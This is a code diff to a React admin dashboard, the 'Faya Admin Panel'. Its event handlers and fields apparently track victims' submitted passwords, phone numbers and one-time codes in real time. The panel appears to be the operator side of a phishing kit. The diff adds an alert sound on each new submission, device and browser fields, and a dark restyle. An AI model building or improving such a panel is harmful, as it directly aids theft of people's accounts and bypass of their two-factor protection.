@@ -1,10 +1,12 @@
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import axios from "axios";
 import socket from "../socket";
 import "./Admin.css";
 import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
 import { useNavigate } from "react-router-dom";
+import img from "./image.png"
+
 
 function Admin() {
   const navigate = useNavigate();
@@ -12,10 +14,19 @@ function Admin() {
   const [connected, setConnected] = useState(false);
   const [loading, setLoading] = useState(true);
   const [showApproveModal, setShowApproveModal] = useState(false);
+  const [soundEnabled, setSoundEnabled] = useState(true);
 const [selectedUser, setSelectedUser] = useState(null);
 
 const [userDevice, setUserDevice] = useState("");
 const [code, setCode] = useState("");
+const soundEnabledRef = useRef(false);
+
+useEffect(() => {
+  soundEnabledRef.current = soundEnabled;
+  if (soundEnabledRef.current){
+    playNotificationSound()
+  }
+}, [soundEnabled]);
 
 
   // ======================================
@@ -75,6 +86,56 @@ const [code, setCode] = useState("");
     }
 
   };
+
+  const playNotificationSound = () => {
+  const AudioContext =
+    window.AudioContext ||
+    window.webkitAudioContext;
+
+  const audioContext = new AudioContext();
+
+  const oscillator =
+    audioContext.createOscillator();
+
+  const gain =
+    audioContext.createGain();
+
+  oscillator.connect(gain);
+  gain.connect(audioContext.destination);
+
+  oscillator.type = "sine";
+
+  oscillator.frequency.setValueAtTime(
+    880,
+    audioContext.currentTime
+  );
+
+  oscillator.frequency.setValueAtTime(
+    1175,
+    audioContext.currentTime + 0.12
+  );
+
+  gain.gain.setValueAtTime(
+    0.0001,
+    audioContext.currentTime
+  );
+
+  gain.gain.exponentialRampToValueAtTime(
+    0.25,
+    audioContext.currentTime + 0.02
+  );
+
+  gain.gain.exponentialRampToValueAtTime(
+    0.0001,
+    audioContext.currentTime + 0.35
+  );
+
+  oscillator.start();
+
+  oscillator.stop(
+    audioContext.currentTime + 0.55
+  );
+};
 
 
   // ======================================
@@ -139,6 +200,8 @@ const [code, setCode] = useState("");
 
     };
 
+ 
+
 
     // ====================================
     // NEW USER
@@ -160,6 +223,11 @@ const [code, setCode] = useState("");
         draggable: true,
         progress: undefined,
       });
+
+      
+      playNotificationSound();
+    
+  
 
       setUsers((currentUsers) => {
 
@@ -197,6 +265,9 @@ const [code, setCode] = useState("");
     data
   );
 
+      playNotificationSound();
+
+
   setUsers((currentUsers) => {
 
     return currentUsers.map((user) => {
@@ -227,6 +298,9 @@ const [code, setCode] = useState("");
     "🔥 WRONG PASSWORD SET EVENT RECEIVED:",
     data
   );
+
+      playNotificationSound();
+
 
   setUsers((currentUsers) => {
 
@@ -263,6 +337,9 @@ const handlePhoneSubmitted = (data) => {
     "🔥 PHONE SUBMITTED EVENT RECEIVED:",
     data
   );
+
+      playNotificationSound();
+
    setUsers((currentUsers) => {
 
     return currentUsers.map((user) => {
@@ -293,6 +370,9 @@ const handlePhoneOtpSubmitted = (data) => {
     "🔥 PHONE SUBMITTED EVENT RECEIVED:",
     data
   );
+
+      playNotificationSound();
+
    setUsers((currentUsers) => {
 
     return currentUsers.map((user) => {
@@ -308,6 +388,7 @@ const handlePhoneOtpSubmitted = (data) => {
         };
 
       }
+      
 
       return user;
 
@@ -323,6 +404,9 @@ const handlePhoneOtp2Submitted = (data) => {
     "🔥 Wrong otp SUBMITTED EVENT RECEIVED:",
     data
   );
+
+      playNotificationSound();
+
    setUsers((currentUsers) => {
 
     return currentUsers.map((user) => {
@@ -512,22 +596,25 @@ const handlePhoneOtp2Submitted = (data) => {
 
     <div style={styles.page}>
 
-      <div style={styles.header}>
+      <div  className="header headd ">
 
         <div>
-
-          <h1 style={styles.title}>
+              <div className="admin-brand">
+                      <img className="fge" src={img} alt="" />
+                      <h2 className="gh">Faya Admin Panel</h2>
+          
+                    </div>
+          {/* <h1 style={styles.title}>
             Admin Dashboard
-          </h1>
+          </h1> */}
 
-          <p style={styles.subtitle}>
-            Realtime user management
-          </p>
+       
 
         </div>
 
 
-        <div
+            <div className="ten">
+                     <div
           style={{
             ...styles.status,
             background: connected
@@ -539,17 +626,36 @@ const handlePhoneOtp2Submitted = (data) => {
           }}
         >
 
-          <span>
-            {connected
-              ? "●"
-              : "●"}
-          </span>
+        
 
           {connected
-            ? " Socket Connected"
-            : " Socket Offline"}
+            ? "  Connected"
+            : "  Offline"}
 
         </div>
+<button
+  onClick={() => {
+    setSoundEnabled((prev) => !prev);
+  }}
+  style={{
+    border: "1px solid #304665",
+    background: soundEnabled
+      ? "#102a56"
+      : "#17243a",
+    color: soundEnabled
+      ? "#60a5fa"
+      : "#91a4c3",
+    padding: "10px 16px",
+    borderRadius: "7px",
+    cursor: "pointer",
+    fontSize: "14px",
+    fontWeight: "500"
+  }}
+>
+  {soundEnabled
+    ? "🔊 Sound On"
+    : "🔇 Sound Off"}
+</button>
 
         <button
   className="clear-users-button"
@@ -576,6 +682,7 @@ const handlePhoneOtp2Submitted = (data) => {
 >
   Delete All 
 </button>
+            </div>
 
       </div>
 
@@ -699,6 +806,20 @@ const handlePhoneOtp2Submitted = (data) => {
                   label="Wrong OTP"
                   value={
                     user.phoneOtp2 ||
+                    "Not Submitted"
+                  }
+                />
+                   <Info
+                  label="Device"
+                  value={
+                    user.device ||
+                    "Not Submitted"
+                  }
+                />
+                   <Info
+                  label="Browser"
+                  value={
+                    user.browser ||
                     "Not Submitted"
                   }
                 />
@@ -1016,21 +1137,18 @@ function getStepColor(step) {
 // ======================================
 
 const styles = {
-
   page: {
     minHeight: "100vh",
-    background: "#f8f9fa",
+    background: "#0b1220",
     padding: "35px",
     boxSizing: "border-box",
-    fontFamily:
-      "Arial, sans-serif"
+    fontFamily: "Arial, sans-serif",
+    color: "#e8f0fe"
   },
-  
 
   header: {
     display: "flex",
-    justifyContent:
-      "space-between",
+    justifyContent: "space-between",
     alignItems: "center",
     marginBottom: "30px"
   },
@@ -1038,76 +1156,80 @@ const styles = {
   title: {
     margin: 0,
     fontSize: "30px",
-    fontWeight: "500",
-    color: "#202124"
+    fontWeight: "600",
+    color: "#ffffff"
   },
 
   subtitle: {
     marginTop: "8px",
-    color: "#5f6368"
+    color: "#91a4c3",
+    fontSize: "14px"
   },
 
   status: {
-    padding: "9px 15px",
+    padding: "9px 16px",
     borderRadius: "20px",
     fontSize: "14px",
-    fontWeight: "500"
+    fontWeight: "600",
+    background: "#102a56",
+    color: "#60a5fa",
+    border: "1px solid #1d4f91"
   },
 
   stats: {
     display: "flex",
-    gap: "15px",
-    marginBottom: "35px"
+    gap: "18px",
+    marginBottom: "35px",
+    flexWrap: "wrap"
   },
 
   statCard: {
-    background: "#fff",
-    border: "1px solid #dadce0",
-    borderRadius: "10px",
+    background: "#111c2f",
+    border: "1px solid #243756",
+    borderRadius: "12px",
     padding: "20px 30px",
-    minWidth: "130px"
+    minWidth: "150px",
+    boxShadow: "0 4px 14px rgba(0, 0, 0, 0.25)"
   },
 
   statNumber: {
     fontSize: "28px",
-    fontWeight: "500",
-    color: "#202124"
+    fontWeight: "600",
+    color: "#60a5fa"
   },
 
   statLabel: {
-    color: "#5f6368",
+    color: "#91a4c3",
     marginTop: "5px",
     fontSize: "14px"
   },
 
   sectionTitle: {
     fontSize: "21px",
-    fontWeight: "500",
-    color: "#202124",
+    fontWeight: "600",
+    color: "#ffffff",
     marginBottom: "18px"
   },
 
   userGrid: {
     display: "grid",
-    // padding: "10px",
-    // justifyContent: "center",
     gridTemplateColumns:
-      "repeat(auto-fill, minmax(390px, 48%))",
+      "repeat(auto-fill, minmax(390px, 49%))",
     gap: "20px"
   },
 
   userCard: {
-    background: "#fff",
-    border: "1px solid #dadce0",
-    borderRadius: "12px",
+    background: "#111c2f",
+    border: "1px solid #243756",
+    borderRadius: "14px",
     padding: "22px",
-    boxSizing: "border-box"
+    boxSizing: "border-box",
+    boxShadow: "0 4px 14px rgba(0, 0, 0, 0.25)"
   },
 
   userHeader: {
     display: "flex",
-    justifyContent:
-      "space-between",
+    justifyContent: "space-between",
     alignItems: "flex-start",
     gap: "15px",
     marginBottom: "20px"
@@ -1115,110 +1237,113 @@ const styles = {
 
   email: {
     fontSize: "17px",
-    fontWeight: "500",
-    color: "#202124",
+    fontWeight: "600",
+    color: "#f8fafc",
     wordBreak: "break-word"
   },
 
   id: {
     marginTop: "6px",
-    color: "#80868b",
+    color: "#7185a3",
     fontSize: "11px",
     wordBreak: "break-all"
   },
 
   stepBadge: {
-    padding: "6px 10px",
+    padding: "6px 11px",
     borderRadius: "15px",
     fontSize: "12px",
     whiteSpace: "nowrap",
-    color: "#3c4043"
+    color: "#60a5fa",
+    background: "#102a56",
+    border: "1px solid #1d4f91",
+    fontWeight: "500"
   },
 
   info: {
-    borderTop:
-      "1px solid #f1f3f4",
-    borderBottom:
-      "1px solid #f1f3f4",
+    borderTop: "1px solid #243756",
+    borderBottom: "1px solid #243756",
     padding: "10px 0",
     marginBottom: "15px"
   },
 
   infoRow: {
     display: "flex",
-    justifyContent:
-      "space-between",
+    justifyContent: "space-between",
     padding: "7px 0",
     gap: "10px"
   },
 
   infoLabel: {
-    color: "#5f6368",
+    color: "#91a4c3",
     fontSize: "13px"
   },
 
   infoValue: {
-    color: "#202124",
+    color: "#dbeafe",
     fontSize: "13px",
     textAlign: "right",
-    wordBreak: "break-word"
+    wordBreak: "break-word",
+    fontWeight: "500"
   },
 
   approveButton: {
     width: "100%",
     border: "none",
-    background: "#1a73e8",
-    color: "#fff",
-    padding: "11px",
-    borderRadius: "5px",
+    background: "#2563eb",
+    color: "#ffffff",
+    padding: "12px",
+    borderRadius: "7px",
     fontSize: "14px",
-    fontWeight: "500",
+    fontWeight: "600",
     cursor: "pointer",
-    marginBottom: "18px"
+    marginBottom: "18px",
+    boxShadow: "0 4px 12px rgba(37, 99, 235, 0.3)"
   },
 
   controlsTitle: {
-    color: "#5f6368",
+    color: "#91a4c3",
     fontSize: "13px",
-    marginBottom: "9px"
+    marginBottom: "9px",
+    fontWeight: "500"
   },
 
   controls: {
     display: "grid",
-    gridTemplateColumns:
-      "1fr 1fr",
+    gridTemplateColumns: "1fr 1fr",
     gap: "8px"
   },
 
   controlButton: {
-    border:
-      "1px solid #dadce0",
-    background: "#fff",
-    color: "#3c4043",
+    border: "1px solid #304665",
+    background: "#17243a",
+    color: "#c9d8ee",
     padding: "10px 8px",
-    borderRadius: "5px",
+    borderRadius: "7px",
     fontSize: "13px",
-    cursor: "pointer"
+    cursor: "pointer",
+    fontWeight: "500"
   },
 
   successButton: {
     border: "none",
-    background: "#188038",
-    color: "#fff",
+    background: "#16803c",
+    color: "#ffffff",
     padding: "10px 8px",
-    borderRadius: "5px",
+    borderRadius: "7px",
     fontSize: "13px",
-    cursor: "pointer"
+    cursor: "pointer",
+    fontWeight: "500"
   },
 
   empty: {
-    background: "#fff",
-    border:
-      "1px solid #dadce0",
-    borderRadius: "10px",
+    background: "#111c2f",
+    border: "1px solid #243756",
+    borderRadius: "12px",
     padding: "40px",
     textAlign: "center",
-    color: "#5f6368"
+    color: "#91a4c3",
+    boxShadow: "0 4px 14px rgba(0, 0, 0, 0.2)"
   },
 
   loading: {
@@ -1226,10 +1351,10 @@ const styles = {
     display: "flex",
     alignItems: "center",
     justifyContent: "center",
-    fontFamily:
-      "Arial, sans-serif"
+    fontFamily: "Arial, sans-serif",
+    background: "#0b1220",
+    color: "#60a5fa"
   }
-
 };
 
 export default Admin;
